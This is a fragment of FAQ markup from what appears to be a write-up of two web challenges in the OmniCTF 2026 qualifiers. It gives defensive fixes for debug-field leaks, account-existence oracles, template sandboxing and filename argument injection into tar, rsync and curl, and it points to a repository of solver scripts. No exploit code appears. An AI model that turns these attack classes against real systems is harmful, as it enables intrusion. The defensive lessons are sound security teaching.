    {"@type": "Question","name": "What defensive pattern would have prevented both challenges?","acceptedAnswer": {"@type": "Answer","text": "Ganzir: strip debug fields at the response serialiser in production, and diff the entire response envelope (body, headers, cookies, length, timing) between real and fake reset paths to close the existence oracle. Bind minimum helpers into template environments or use SandboxedEnvironment. StayWild: enforce authorisation server-side on every route, reject uploaded filenames starting with -, always pass user-controlled args after -- on tar/rsync/wget/curl/git invocations."}},
    {"@type": "Question","name": "What's the broader lesson from the OmniCTF 2026 Quals web track?","acceptedAnswer": {"@type": "Answer","text": "Frontend controls are not backend controls, and debug fields don't belong in production API responses. Both bugs are mundane by CTF standards but pattern-match to real-world classes (Rails stack traces, Django DEBUG=True, Spring Actuator /env, feature-flagged admin routes without server-side authz, CI pipelines compromised via attacker-controlled repo filenames flowing to tar/rsync/find). Also: loud misdirection is often loud on purpose; check the mundane channel first."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs, handouts, and pure-stdlib Python solvers at github.com/Abdelkad3r/OmniCTF-2026-Quals. Each challenge has a solve.py reproducing the flag against a fresh instance. Both solvers use only Python standard library (urllib, json, base64, tarfile, io); no requests, no pwntools. Python 3.8+ is sufficient."}}
  ]
}
</script>
